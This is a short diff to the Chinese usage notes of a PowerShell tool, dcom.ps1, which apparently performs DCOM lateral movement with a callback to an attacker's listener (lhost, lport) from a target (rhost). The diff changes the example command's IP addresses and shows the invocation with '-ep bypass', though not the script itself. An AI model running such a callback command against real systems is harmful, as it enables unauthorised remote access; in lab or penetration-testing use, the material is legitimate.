@@ -4,7 +4,7 @@
 使用方法：
 powershell -ep bypass -c ".\dcom.ps1 lhost lport rhost"
 例：
-powershell -ep bypass -c ".\dcom.ps1 127.0.0.1 3333 192.168.8.8"
+powershell -ep bypass -c ".\dcom.ps1 192.168.45.195 3333 192.168.195.72"
 
 lhost：攻击机IP
 lport：攻击机的监听端口
